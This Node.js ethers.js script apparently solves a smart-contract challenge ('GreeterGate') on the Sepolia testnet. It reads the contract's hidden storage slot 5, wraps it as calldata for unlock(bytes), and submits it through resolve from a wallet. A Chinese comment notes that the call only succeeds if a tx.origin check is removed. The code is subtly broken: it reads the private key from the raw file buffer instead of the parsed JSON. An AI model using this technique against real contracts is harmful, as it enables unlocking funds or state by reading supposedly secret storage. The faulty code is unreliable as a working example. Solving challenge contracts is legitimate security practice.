
const {ethers} = require("ethers");
const abiCoder = ethers.utils.defaultAbiCoder;

const fs = require('fs')

const keyConfig = fs.readFileSync('../../keyConfig.json');
const keyConfigJson = JSON.parse(keyConfig);

const provider = new ethers.providers.JsonRpcProvider(keyConfigJson.RPCProvider["sepolica.testnet"]);
const greeterGateAddr = "0x4fb90a2E48c16d2e7DD89F323Def190E9647a948"
const greeterGateJsonStr = fs.readFileSync('./greeterGate.json')
const greeterGateAbi = JSON.parse(greeterGateJsonStr)

const privateKey = keyConfig.account["privateKey"];
const wallet = new ethers.Wallet(privateKey, provider)
const greeterGateWriter = new ethers.Contract(greeterGateAddr, greeterGateAbi, wallet);

const main = async () => {
    let data = await provider.getStorageAt(greeterGateAddr, 5);
    console.log(data);

    const unlockSignature = ethers.utils.id("unlock(bytes)");
    // console.log(unlockSignature)
    const unlockSelector = unlockSignature.substring(0, 10);
    console.log(unlockSelector)

    const unlockCalldata = abiCoder.encode(["bytes4", "bytes"], [unlockSelector, data]);
    console.log(unlockCalldata);
    //只有resolve函数中去掉require(msg.sender != tx.origin)限制，才能调用成功
    let tx2 = await greeterGateWriter.resolve(unlockCalldata);
    await tx2.wait()

}

main()

